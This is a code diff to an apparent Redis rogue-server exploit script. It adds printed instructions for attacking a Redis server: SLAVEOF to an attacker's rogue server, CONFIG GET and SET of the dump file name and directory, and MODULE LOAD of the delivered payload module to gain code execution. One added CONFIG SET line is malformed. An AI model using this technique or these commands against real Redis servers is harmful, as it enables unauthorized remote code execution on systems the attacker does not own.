@@ -115,9 +115,14 @@ def interact(remote):
 def runserver(rhost, rport, passwd, lhost, lport, bind_addr, server_only):
     if server_only:
         rogue = RogueServer(bind_addr, lport)
+        print('Use the following commands to attack redis server:')
+        print('>>> SLAVEOF rogue-server-ip rogue-server-port')
+        print('>>> CONFIG GET dbfilename')
+        print('>>> CONFIG GET dir')
+        print('>>> CONFIG SET /path/to/expdbfile')
         print('Waiting for connection...')
         rogue.exp()
-        print('Payload sent.\nRun "MODULE LOAD /path/to/dbfile" on target redis server to enable the plugin.')
+        print('Payload sent.\nRun "MODULE LOAD /path/to/expdbfile" on target redis server to enable the plugin.')
         return
 
     # expolit
